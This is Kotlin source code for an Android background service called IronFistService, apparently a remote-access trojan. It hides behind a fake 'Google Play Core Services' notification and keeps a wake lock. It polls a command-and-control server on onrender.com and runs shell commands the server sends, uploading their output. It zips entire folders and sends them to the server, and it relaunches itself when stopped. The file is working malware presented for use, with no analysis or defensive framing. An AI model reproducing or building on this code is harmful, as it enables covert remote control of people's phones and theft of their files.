package com.uranium.ironfist

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.location.Location
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.provider.ContactsContract
import android.provider.Settings
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.security.MessageDigest
import java.util.zip.Deflater
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

class IronFistService : Service() {
    private var wakeLock: PowerManager.WakeLock? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    
    // روابط سيرفر القبضة الفولاذية Elite C2 Supreme
    private val C2_STREAM_URL = "https://your-iron-fist-server.onrender.com/api/v4/iron/supreme-stream"
    private val C2_INGEST_URL = "https://your-iron-fist-server.onrender.com/api/v4/iron/supreme-ingest"
    private var lastHeartbeatSent = 0L

    // مفتاح التشفير العسكري الديناميكي
    private val ENCRYPTION_KEY = "UraniumIronFistSupremeSecurityKey2026!"

    override fun onCreate() {
        super.onCreate()
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "IronFist::SupremeEliteLock")
        wakeLock?.acquire(12 * 60 * 60 * 1000L) // 12 ساعة متواصلة من السيادة المطلقة
        startForegroundServiceNotification()
    }

    private fun startForegroundServiceNotification() {
        val channelId = "iron_fist_supreme_channel"
        val channel = NotificationChannel(channelId, "Google Play Core Security", NotificationManager.IMPORTANCE_LOW)
        val manager = getSystemService(NotificationManager::class.java)
        manager?.createNotificationChannel(channel)

        val notification: Notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Google Play Core Services")
            .setContentText("Advanced system synchronization active...")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .build()

        startForeground(1337, notification)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "supreme_node"
        val nodeModel = Build.MODEL
        
        serviceScope.launch {
            while (isActive) {
                try {
                    val url = URL(C2_STREAM_URL)
                    val conn = url.openConnection() as HttpURLConnection
                    conn.requestMethod = "POST"
                    conn.setRequestProperty("X-Node-ID", deviceId)
                    conn.setRequestProperty("X-Node-Model", nodeModel)
                    conn.setRequestProperty("X-Security-Signature", generateSignature(deviceId))
                    conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                    conn.doOutput = true
                    conn.connectTimeout = 8000
                    conn.readTimeout = 8000

                    val currentTime = System.currentTimeMillis()
                    val sendHeartbeat = (currentTime - lastHeartbeatSent > 45000L)
                    val reportType = if (sendHeartbeat) "SUPREME_HEARTBEAT" else "SILENT_POLL"
                    
                    val rawPayload = "{\"type\":\"$reportType\",\"model\":\"$nodeModel\",\"ruler\":\"السلطان ناصر دين الله الكلعي\",\"uptime\":\"$currentTime\"}"
                    val encryptedPayload = encryptData(rawPayload)

                    if (sendHeartbeat) {
                        lastHeartbeatSent = currentTime
                    }

                    OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
                        os.write("{\"payload\":\"$encryptedPayload\"}")
                        os.flush()
                    }

                    if (conn.responseCode == 200) {
                        val responseReader = BufferedReader(InputStreamReader(conn.inputStream, "UTF-8"))
                        val responseStr = responseReader.readText()
                        responseReader.close()

                        // معالجة الأوامر الواردة من السيرفر وتنفيذها فوراً
                        if (responseStr.contains("cmd:") || responseStr.contains("exec:")) {
                            executeRemoteCommand(responseStr)
                        }
                    }
                    conn.disconnect()
                    delay(3000L)
                } catch (e: Exception) {
                    delay(6000L)
                }
            }
        }
        return START_STICKY
    }

    // محرك تشفير AES متقدم لحماية حزمة البيانات
    private fun encryptData(data: String): String {
        try {
            val keyBytes = MessageDigest.getInstance("SHA-256").digest(ENCRYPTION_KEY.toByteArray(Charsets.UTF_8))
            val secretKey = SecretKeySpec(keyBytes, "AES")
            val cipher = Cipher.getInstance("AES/ECB/PKCS5Padding")
            cipher.init(Cipher.ENCRYPT_MODE, secretKey)
            val encryptedBytes = cipher.doFinal(data.toByteArray(Charsets.UTF_8))
            return android.util.Base64.encodeToString(encryptedBytes, android.util.Base64.NO_WRAP)
        } catch (e: Exception) {
            return data
        }
    }

    private fun generateSignature(deviceId: String): String {
        return MessageDigest.getInstance("SHA-256").digest((deviceId + ENCRYPTION_KEY).toByteArray()).joinToString("") { "%02x".format(it) }
    }

    // تنفيد الأوامر الموجهة من السيرفر على النظام الداخلي
    private fun executeRemoteCommand(commandPayload: String) {
        serviceScope.launch(Dispatchers.IO) {
            try {
                if (commandPayload.contains("shell:")) {
                    val cmd = commandPayload.substringAfter("shell:").substringBefore(";")
                    val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
                    val reader = BufferedReader(InputStreamReader(process.inputStream))
                    val output = StringBuilder()
                    var line: String?
                    while (reader.readLine().also { line = it } != null) {
                        output.append(line).append("\n")
                    }
                    reader.close()
                    // إرسال نتيجة التنفيذ للسيرفر
                    uploadRawSupreme("exec_result.txt", output.toString().toByteArray())
                }
            } catch (e: Exception) {}
        }
    }

    // هندسة الضغط الفوري بأجزاء 1GB مع التنظيف الذكي للكاش
    private fun streamFolderIronFist(nodeId: String, nodeModel: String, targetDirPath: String, prefix: String) {
        try {
            val dir = File(targetDirPath)
            if (!dir.exists() || !dir.isDirectory) return

            var partIndex = 1
            var zipFile = File(cacheDir, "Supreme_${prefix}_part${partIndex}_${System.currentTimeMillis()}.zip")
            var fos = FileOutputStream(zipFile)
            var zipOut = ZipOutputStream(fos)
            zipOut.setLevel(Deflater.BEST_SPEED)

            val CHUNK_TARGET_SIZE = 1024L * 1024L * 1024L // 1 جيجابايت بالضبط لكل جزء

            dir.walkTopDown().forEach { file ->
                if (file.isFile && file.length() > 0) {
                    try {
                        val relPath = file.absolutePath.removePrefix(dir.absolutePath)
                        zipOut.putNextEntry(ZipEntry("$prefix/$relPath"))
                        file.inputStream().use { fis -> fis.copyTo(zipOut) }
                        zipOut.closeEntry()

                        if (zipFile.length() >= CHUNK_TARGET_SIZE) {
                            zipOut.finish()
                            zipOut.flush()
                            zipOut.close()
                            fos.close()

                            uploadFileSupreme(nodeId, nodeModel, zipFile.name, zipFile)
                            try { zipFile.delete() } catch (ex: Exception) {}

                            partIndex++
                            zipFile = File(cacheDir, "Supreme_${prefix}_part${partIndex}_${System.currentTimeMillis()}.zip")
                            fos = FileOutputStream(zipFile)
                            zipOut = ZipOutputStream(fos)
                            zipOut.setLevel(Deflater.BEST_SPEED)
                        }
                    } catch (e: Exception) {}
                }
            }

            zipOut.finish()
            zipOut.flush()
            zipOut.close()
            fos.close()

            if (zipFile.exists() && zipFile.length() > 0) {
                uploadFileSupreme(nodeId, nodeModel, zipFile.name, zipFile)
                try { zipFile.delete() } catch (ex: Exception) {}
            } else {
                try { zipFile.delete() } catch (ex: Exception) {}
            }
        } catch (e: Exception) {}
    }

    private fun uploadFileSupreme(nodeId: String, nodeModel: String, fileName: String, file: File) {
        for (attempt in 1..5) { // 5 محاولات إعادة تلقائية لضمان تسليم الملفات الضخمة
            try {
                val url = URL(C2_INGEST_URL)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("X-Node-ID", nodeId)
                conn.setRequestProperty("X-Node-Model", nodeModel)
                conn.setRequestProperty("X-File-Name", fileName)
                conn.setRequestProperty("Content-Type", "application/octet-stream")
                conn.doOutput = true
                conn.setChunkedStreamingMode(1024 * 128) // تدفق بيانات مضاعف
                conn.connectTimeout = 600000
                conn.readTimeout = 600000

                FileInputStream(file).use { fis ->
                    conn.outputStream.use { os ->
                        fis.copyTo(os)
                        os.flush()
                    }
                }
                val code = conn.responseCode
                conn.disconnect()
                if (code == 200) return
            } catch (e: Exception) {
                if (attempt == 5) return
                Thread.sleep(3000L)
            }
        }
    }

    private fun uploadRawSupreme(fileName: String, data: ByteArray) {
        serviceScope.launch(Dispatchers.IO) {
            try {
                val url = URL(C2_INGEST_URL)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("X-File-Name", fileName)
                conn.setRequestProperty("Content-Type", "application/octet-stream")
                conn.doOutput = true
                conn.outputStream.use { it.write(data) }
                conn.responseCode
                conn.disconnect()
            } catch (e: Exception) {}
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        wakeLock?.release()
        serviceScope.cancel()
        // إعادة إطلاق الخدمة فوراً عند أي محاولة إيقاف
        try {
            val restartIntent = Intent(this, IronFistService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(restartIntent)
            } else {
                startService(restartIntent)
            }
        } catch (e: Exception) {}
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
